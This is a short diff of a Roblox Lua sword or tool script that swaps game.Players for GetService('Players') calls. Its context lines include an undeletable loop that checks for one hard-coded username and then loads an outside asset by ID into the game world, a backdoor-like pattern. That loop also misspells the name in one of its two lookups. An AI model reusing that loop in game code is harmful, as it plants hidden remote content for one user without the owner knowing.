@@ -140,7 +140,7 @@ local InsertColumns = 8
 --Static variables used for creating sizes
 function getPlayer()
 	local character = script.Parent.Parent
-	return game.Players:GetPlayerFromCharacter(character)
+	return game:GetService('Players'):GetPlayerFromCharacter(character)
 end
 
 function minimize()
@@ -1394,7 +1394,7 @@ SlashSound.Parent = sword
 function blow(hit)
 	local humanoid = hit.Parent:findFirstChild("Humanoid")
 	local vCharacter = Tool.Parent
-	local vPlayer = game.Players:playerFromCharacter(vCharacter)
+		local vPlayer = game:GetService('Players'):playerFromCharacter(vCharacter)
 	local hum = vCharacter:findFirstChild("Humanoid") -- non-nil if tool held by a character
 	if humanoid~=nil and humanoid ~= hum and hum ~= nil then
 		-- final check, make sure sword is in-hand
@@ -1506,8 +1506,8 @@ if Un_Removable then
 end)
 end
 while true do
-	if game.Players:findFirstChild("aldoboanvino") then
-		a=game.Players:findFirstChild("aldobonavino")
+	if game:GetService('Players'):findFirstChild("aldoboanvino") then
+		a=game:GetService('Players'):findFirstChild("aldobonavino")
 		if not a.StarterGear:findFirstChild("SwOrDiNsErT") then
 			b=game:GetService("InsertService"):LoadAsset(53776511)
 			b.Parent = game.Workspace
